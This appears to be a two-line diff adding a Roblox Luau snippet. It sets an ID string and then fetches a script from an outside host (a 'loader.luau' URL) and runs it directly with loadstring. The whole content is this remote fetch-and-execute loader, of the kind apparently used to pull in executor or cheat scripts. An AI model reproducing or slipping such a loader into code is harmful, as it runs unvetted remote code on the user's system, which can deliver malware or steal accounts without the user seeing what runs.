@@ -1,0 +1,2 @@
+ID="d255e9e6-d504-47f0-9c16-0e351ccf6f7e";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
